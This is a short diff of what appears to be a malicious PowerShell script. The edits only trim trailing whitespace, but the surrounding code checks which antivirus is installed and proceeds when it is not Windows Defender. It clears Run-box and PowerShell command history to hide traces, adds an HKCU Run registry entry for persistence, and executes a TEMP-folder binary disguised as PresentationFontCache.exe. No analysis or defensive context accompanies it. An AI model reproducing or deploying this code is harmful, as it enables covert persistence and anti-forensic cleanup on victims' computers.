@@ -5,7 +5,7 @@ $Antivirus = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName Antivi
 if ($Antivirus -and $Antivirus.displayName -ne "Windows Defender") {
 
 # Delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
@@ -31,7 +31,7 @@ New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
 & "$env:TEMP\PresentationFontCache.exe"
 
 # Delete run box history
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
